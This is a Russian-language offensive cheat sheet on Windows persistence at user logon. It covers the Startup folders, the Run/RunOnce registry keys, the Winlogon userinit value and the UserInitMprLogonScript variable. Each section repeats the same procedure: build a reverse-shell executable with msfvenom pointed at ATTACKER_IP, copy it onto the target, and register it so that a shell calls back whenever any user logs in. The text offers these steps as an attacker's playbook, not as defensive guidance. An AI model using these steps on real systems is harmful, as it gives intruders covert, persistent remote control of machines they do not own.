# Можно выполнить вредоносный payload при событии login юзера.

#### Startup folder ####
# У каждого юзера есть папка startup, если положить в нее исполняемый файл, он будет выполнен в момент авторизации
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# Есть общая папка для всех юзеров
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 

## 1. Генерируем payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
## 2. Передаем на целевую машину и копируем в нужную папку
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
## 3. Любой пользователь авторизуется на целевой машине и нам прилетает revshell.

#### Run / RunOnce ####
# В Windows есть специальные ключи реестра, которые указывают, какие программы запускать при входе пользователя в систему.
# Находятся ключи здесь:
    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

## 1. Генерируем payload
## 2. Перемещаем на целевую машину в папку windows
move revshell.exe C:\Windows
## 3. Создаем запись REG_EXPAND_SZ в реестре HKLM\Software\Microsoft\Windows\CurrentVersion\Run
regedit > HKLM\Software\Microsoft\Windows\CurrentVersion\Run > new > Expanded String Value >
C:\Windows
## 4. Любой пользователь авторизуется на целевой машине и нам прилетает revshell.


#### Winlogon ####
# Это компонент, который загружает профиль пользователя сразу после авторизации
# HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ здесь находятся ключи реестра для этого компонента
# Ключ Shell отвечает за предоставление оболочки пользователю
# Ключ userinit отвечает за восстановление настроек профиля юзера
# Подменять выполняемые скрипты этих ключей нежелательно т.к мы вмешиваемся в алгоритм авторизации, но Winlogon также выполнит скрипты, которые будут переданы через запятую

## 1. Генерируем payload и передаем на целевую машину и запускаем слушатель на атакующей машине
## 2. Заходим в regedit > HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\  > например в userinit через запятую указываем путь до нашего файла C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe
## 3. Любой пользователь авторизуется на целевой машине и мы получаем shell.

#### Logon scripts ####
# winlogon для userinit использует перемунную окружения UserInitMprLogonScript, по дефолту она не установлена и для каждого юзера своя.
# HKCU\Environment - реестр в котором хранятся переменные для текущего юзера.

## 1. Генерируем payload и передаем на целевую машину и запускаем слушатель на атакующей машине
## 2. Заходим в regedit > HKCU\Environment и создаем Expanded String Value ключ UserInitMprLogonScript со значением С:\Windows\revshell.exe
## 3. Любой пользователь авторизуется на целевой машине и мы получаем shell.